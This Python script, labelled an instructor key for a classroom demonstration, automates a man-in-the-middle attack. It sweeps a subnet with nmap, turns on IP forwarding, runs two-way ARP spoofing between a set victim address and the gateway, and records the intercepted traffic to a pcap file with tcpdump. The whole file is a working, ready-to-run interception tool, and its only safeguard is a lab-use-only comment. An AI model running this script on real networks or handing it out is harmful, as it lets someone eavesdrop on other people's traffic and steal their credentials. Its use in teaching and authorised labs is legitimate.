#!/usr/bin/env python3
"""
MITM Demonstration Script — Instructor Key (Cross-Platform)
Author: Instructor
Date: 2025-08-25

Description:
  Automates a MITM chain (ARP spoof + packet capture).
  Handles OS differences:
    - Linux: enables/disables IP forwarding
    - macOS: prints warning, skips forwarding (SIP prevents it)

⚠️ For classroom/lab use only (isolated, legal training environments).
"""

import subprocess, signal, sys, shutil, platform

NETWORK_RANGE = "192.168.1.0/24"
VICTIM_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"
INTERFACE = "en0"

processes = []


def run(cmd, background=False):
    """Run a system command."""
    if background:
        p = subprocess.Popen(cmd)
        processes.append(p)
        return p
    else:
        subprocess.run(cmd, check=True)


def check_requirements():
    for cmd in ["nmap", "arpspoof", "tcpdump"]:
        if not shutil.which(cmd):
            print(f"❌ Error: {cmd} not installed or not in PATH.")
            sys.exit(1)


def discover_hosts():
    print(f"[*] Discovering hosts in {NETWORK_RANGE} ...")
    run(["nmap", "-sn", "-T4", NETWORK_RANGE])  # T4 = faster timing


def enable_forwarding():
    osname = platform.system()
    if osname == "Linux":
        print("[*] Enabling IP forwarding (Linux) ...")
        run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    elif osname == "Darwin":  # macOS
        print("[*] Skipping IP forwarding — macOS blocks this via SIP.")
    else:
        print(f"[!] Unknown platform {osname}. Skipping forwarding.")


def disable_forwarding():
    osname = platform.system()
    if osname == "Linux":
        print("[*] Disabling IP forwarding (Linux) ...")
        try:
            run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
        except Exception:
            pass
    elif osname == "Darwin":
        print("[*] Nothing to disable (forwarding skipped on macOS).")


def launch_spoof():
    print(f"[*] Launching ARP spoof: {VICTIM_IP} <-> {GATEWAY_IP}")
    run(["sudo", "arpspoof", "-i", INTERFACE, "-t", VICTIM_IP, GATEWAY_IP], background=True)
    run(["sudo", "arpspoof", "-i", INTERFACE, "-t", GATEWAY_IP, VICTIM_IP], background=True)


def start_capture():
    print(f"[*] Capturing on {INTERFACE} → mitm_capture.pcap")
    run(["sudo", "tcpdump", "-i", INTERFACE, "-w", "mitm_capture.pcap"], background=True)


def cleanup(*_):
    print("[*] Cleaning up ...")
    disable_forwarding()
    for p in processes:
        try:
            p.terminate()
        except Exception:
            pass
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    check_requirements()
    discover_hosts()
    enable_forwarding()
    launch_spoof()
    start_capture()
    signal.pause()  # Wait until Ctrl+C

